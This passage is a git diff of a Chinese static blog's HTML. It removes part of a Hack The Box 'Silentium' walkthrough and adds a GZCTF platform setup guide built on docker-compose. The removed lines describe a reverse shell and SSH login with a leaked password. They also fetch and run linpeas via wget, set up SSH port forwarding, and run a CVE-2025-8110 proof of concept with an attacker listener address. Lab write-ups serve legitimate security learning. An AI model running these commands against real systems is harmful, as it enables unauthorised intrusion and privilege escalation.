&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot; # this is required for k8s deployment</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span> <span class="hljs-comment"># this is required for docker deployment</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:alpine</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;POSTGRES_PASSWORD=&lt;Your POSTGRES_PASSWORD&gt;&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/db:/var/lib/postgresql&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>在<a target="_blank" rel="noopener" href="http://staging.silentium.htb/apikey%E8%8E%B7%E5%8F%96APIkey">http://staging.silentium.htb/apikey获取APIkey</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc<br></code></pre></td></tr></table></figure>
+<p>然后执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose down<br>docker-compose up -d<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/16/Silentium/image-20260417002213070.png" srcset="/img/loading.gif" lazyload alt="image-20260417002213070"></p>
-<p>反弹shell成功</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002215832.png" srcset="/img/loading.gif" lazyload alt="image-20260417002215832"></p>
-<p>现在身份是root，但是是在docker容器中的，这里可以尝试查看环境变量</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002219300.png" srcset="/img/loading.gif" lazyload alt="image-20260417002219300"></p>
-<p>在这里看到了password，尝试利用ssh登录之前的ben用户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh ben@10.129.24.124<br>password:r04D!!_R4ge<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2026/04/16/Silentium/image-20260417002222190.png" srcset="/img/loading.gif" lazyload alt="image-20260417002222190"></p>
-<p>得到userflag</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002226086.png" srcset="/img/loading.gif" lazyload alt="image-20260417002226086"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">6f2b1cf6144d71e35dffb0a5dfd268ce<br></code></pre></td></tr></table></figure>
-
-<h1 id="RootFlag"><a href="#RootFlag" class="headerlink" title="RootFlag"></a>RootFlag</h1><blockquote>
-<p>CVE-2025-8110</p>
-</blockquote>
-<p>先利用linpeas查看是否存在可利用的提权</p>
-<p>现在kali上起一个php服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0:8081<br></code></pre></td></tr></table></figure>
-
-<p>再利用wget将linpeas传到靶机上</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.17.116:8081/linpeas.sh<br></code></pre></td></tr></table></figure>
-
-<p>获得运行权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linpeas.sh<br>./linpeas.sh<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2026/04/16/Silentium/image-20260417002228938.png" srcset="/img/loading.gif" lazyload alt="image-20260417002228938"></p>
-<p>但是没有发现什么可用的，既没有suid也没有sudo</p>
-<p>尝试查看网络服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -tulpn<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2026/04/16/Silentium/image-20260417002232134.png" srcset="/img/loading.gif" lazyload alt="image-20260417002232134"></p>
-<p>看到有3001端口，利用端口转发带出</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -L 3001:127.0.0.1:3001 ben@10.129.24.124<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2026/04/16/Silentium/image-20260417002236195.png" srcset="/img/loading.gif" lazyload alt="image-20260417002236195"></p>
-<p>本地访问<a target="_blank" rel="noopener" href="http://127.0.0.1:3001/">http://127.0.0.1:3001/</a></p>
-<p><img src="/2026/04/16/Silentium/image-20260417002245711.png" srcset="/img/loading.gif" lazyload alt="image-20260417002245711"></p>
-<p>注册一个普通账户登录111，密码是123</p>
-<p>找到CVE-2025-8110poc：<a target="_blank" rel="noopener" href="https://github.com/Ghxstsec/CVE-2025-8110">https://github.com/Ghxstsec/CVE-2025-8110</a></p>
-<p><img src="/2026/04/16/Silentium/image-20260417002242826.png" srcset="/img/loading.gif" lazyload alt="image-20260417002242826"></p>
-<p>这里需要修改成自己的username和token</p>
-<p>token的获取在&#x2F;user&#x2F;settings&#x2F;applications路由下</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002249485.png" srcset="/img/loading.gif" lazyload alt="image-20260417002249485"></p>
-<p>修改保存后就可以运行代码了</p>
-<p>先在kali上监听一个6666端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2025-8110.py -u http://127.0.0.1:3001 -lh 10.10.17.116 -lp 6666 -p <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2026/04/16/Silentium/image-20260417002252224.png" srcset="/img/loading.gif" lazyload alt="image-20260417002252224"></p>
-<p>得到flag</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002255227.png" srcset="/img/loading.gif" lazyload alt="image-20260417002255227"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">58a4cf6091deb7802da594aa78ea539a<br></code></pre></td></tr></table></figure>
-
+<p>然后在浏览器就可以访问到平台了，通过Admin登录，密码就是刚刚两个文件里写的密码</p>
+<p><img src="/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20260419000806420.png" srcset="/img/loading.gif" lazyload alt="image-20260419000806420"></p>
 
                 
               </div>
@@ -575,12 +489,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  <a href="/categories/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" class="category-chain-item">平台搭建</a>
   
   
     <span>></span>
     
-  <a href="/categories/%E6%B8%97%E9%80%8F/HTB/" class="category-chain-item">HTB</a>
+  <a href="/categories/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/GZCTF/" class="category-chain-item">GZCTF</a>
   
   
 
@@ -597,7 +511,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+        <a href="/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/" class="print-no-link">#环境部署</a>
       
     </div>
   
@@ -609,8 +523,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Silentium</div>
-      <div>https://colourful228.github.io/2026/04/16/Silentium/</div>
+      <div>GZCTF平台搭建</div>
+      <div>https://colourful228.github.io/2026/04/17/GZCTF平台搭建/</div>
     </div>
     <div class="license-meta">
       
@@ -622,13 +536,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年4月16日</div>
+          <div>2026年4月17日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年4月17日</div>
+          <div>2026年4月19日</div>
         </div>
       
       
@@ -659,18 +573,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" title="GZCTF平台搭建">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">GZCTF平台搭建</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/04/15/sudo%E6%8F%90%E6%9D%83/" title="sudo提权">
-                        <span class="hidden-mobile">sudo提权</span>
+                      <a href="/2026/04/16/Silentium/" title="Silentium">
+                        <span class="hidden-mobile">Silentium</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
